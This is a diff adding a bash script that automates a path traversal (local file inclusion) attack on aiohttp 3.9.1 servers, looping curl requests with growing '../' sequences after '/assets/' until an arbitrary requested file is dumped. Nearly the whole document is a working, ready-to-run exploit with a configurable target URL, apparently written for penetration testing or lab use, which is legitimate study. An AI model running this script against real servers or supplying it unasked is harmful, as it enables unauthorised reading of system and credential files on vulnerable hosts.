@@ -1,0 +1,86 @@
+#!/bin/bash
+
+# Author TheRedP4nther
+# Description: Script to automate a Local File Inclusion (LFI) on the aiohttp 3.9.1 server.
+# Usage: ./lfi_aiohttp.sh -f /path/to/file/to/dump
+
+#Colours
+greenColour="\e[0;32m\033[1m"
+endColour="\033[0m\e[0m"
+redColour="\e[0;31m\033[1m"
+blueColour="\e[0;34m\033[1m"
+yellowColour="\e[0;33m\033[1m"
+purpleColour="\e[0;35m\033[1m"
+turquoiseColour="\e[0;36m\033[1m"
+grayColour="\e[0;37m\033[1m"
+
+# Global Variables
+file="$1"
+main_url="http://localhost:8080" # Change if necessary.
+payload="/assets/" # Change if necessary.
+string="../"
+
+# Functions
+function ctrl_c(){
+  echo -e "\n${redColour}[+] Leaving the program...${endColour}\n"
+  tput cnorm; exit 1 # Forced exit and recover the cursor.
+}
+
+function helpPanel(){
+  echo -e "\n$purpleColour[i]${endColour} ${grayColour}USE OF THE PROGRAM:${endColour} ${purpleColour}$0 -f /file/to/dump${endColour}\n"
+  echo -e "\t${grayColour}[1]${endColour} ${purpleColour}f)${endColour} ${grayColour}Indicate the file you want to dump.${endColour}"
+  echo -e "\t${grayColour}[2]${endColour} ${purpleColour}h)${endColour} ${grayColour}Get de Help Panel.${endColour}\n"
+}
+
+function getFile(){
+  file="$1"
+
+  url_checker="$(curl -s -o /dev/null -w "%{http_code}" --path-as-is "$main_url")" 
+
+  tput civis # Remove the cursor from the screen to a better experience.
+  
+  for i in $(seq 1 15); do
+    if [ "$url_checker" -eq 200 ]; then 
+      command="$(curl -s --path-as-is "$main_url$payload$string$file")"
+      output_checker="$(echo "$command" | grep 404)"
+      if [ ! "$output_checker" ]; then 
+        echo -e "\n${yellowColour}[+] Curl output to the resulting url: $main_url$payload$string$file.${endColour}\n"
+        echo -e "\n${purpleColour}$command${endColour}"
+        echo -e "\n${yellowColour}[+] File dumped successfully.${endColour}\n"
+        break
+      else
+        payload+="$string"
+      fi
+    else 
+      echo -e "\n${redColour}[+] The URL is not valid or active. Check it and try again.${endColour}\n"
+      tput cnorm # Recover cursor if URL is invalid.
+      break
+    fi
+  done
+
+  tput cnorm # Recover the cursor after a successful execution.
+}
+
+# Ctrl+C 
+trap ctrl_c INT
+
+if [ "$file" ]; then 
+  :
+else
+  echo -e "\n${redColour}[!] No file indicated to dump.${endColour}"
+fi
+
+declare -i counter=0
+
+while getopts "f:h" arg; do 
+case $arg in
+  f)file="$OPTARG"; let counter+=1;;
+  h);;
+esac
+done
+
+if [ "$counter" -eq 1 ]; then 
+  getFile "$file"
+else 
+  helpPanel
+fi
